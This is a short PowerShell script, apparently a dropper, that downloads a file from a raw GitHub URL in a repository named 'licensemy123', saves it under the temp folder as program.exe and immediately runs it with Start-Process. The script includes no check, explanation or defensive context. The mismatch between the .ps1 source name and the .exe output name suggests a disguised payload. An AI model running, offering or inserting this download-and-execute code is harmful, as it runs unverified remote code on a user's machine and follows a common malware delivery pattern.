$url = "https://raw.githubusercontent.com/fasa3e/licensemy123/refs/heads/main/script.ps1"
$output = "$env:TEMP\program.exe"
Invoke-WebRequest -Uri $url -OutFile $output
Start-Process $output
